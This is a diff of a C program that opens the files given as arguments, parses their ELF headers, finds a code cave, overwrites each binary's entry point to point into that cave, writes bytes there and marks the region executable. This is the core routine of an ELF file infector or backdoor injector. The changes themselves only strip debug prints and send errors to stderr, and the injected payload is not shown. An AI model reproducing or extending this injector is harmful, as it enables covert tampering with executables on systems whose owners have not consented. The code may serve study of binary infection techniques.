@@ -26,8 +26,6 @@ int main(int argc, char **argv) {
         exit(0);
     }
 
-    printf("argc: %d\n", argc);
-
     for (int i = 1; i < argc; i++) {
         int fd = open(argv[i], O_RDWR);
 
@@ -41,16 +39,13 @@ int main(int argc, char **argv) {
         posix_spawn(&pid, "chmod", NULL, NULL, args, NULL);
 
         Elf64_Ehdr ehdr = ElfExtractHeader(fd);
-        printf("Extracted elf header!\n");
         Elf64_Phdr phdr = ElfExtractProgramHeader(fd, ehdr);
-        printf("Extracted program header!\n");
-
         // store the original return address
         Elf64_Addr original = ehdr.e_entry;
         printf("Original entry point at %d\n", original);
 
         CodeCave codeCave = FindCodeCave(fd, phdr, ehdr);
-        printf("Found code cave at %d with offset %d and size %d\n", codeCave.vaddr, codeCave.offset, codeCave.size);
+
         ehdr.e_entry = codeCave.vaddr;
         int err = lseek(fd, 0, SEEK_SET);
         if (err < 0) {
@@ -58,9 +53,6 @@ int main(int argc, char **argv) {
             goto end;
         }
         write(fd, &ehdr, sizeof(ehdr));
-        
-        Elf64_Addr shiftedAddr = convertLittleEndian(original);
-        printf("Shifted address\n");
 
         err = lseek(fd, codeCave.offset, SEEK_SET);
         // is this bad? Does this make me the worst programmer ever? Probably
@@ -68,7 +60,7 @@ int main(int argc, char **argv) {
         // I'm leaving this as a goto right now
         // TODO: care about code style
         if (err < 0) {
-            fprintf(stdout, "Couldn't lseek to code cave position\n");
+            fprintf(stderr, "Couldn't lseek to code cave position\n");
             goto end;
         }
         // are these zero bytes going to be identified as a null terminator?
@@ -78,7 +70,7 @@ int main(int argc, char **argv) {
 
         err = ElfMarkExecutable(ehdr, codeCave.offset, fd);
         if (err) {
-            fprintf(stdout, "Couldn't mark section executable\n");
+            fprintf(stderr, "Couldn't mark section executable\n");
             goto end;
         }
 
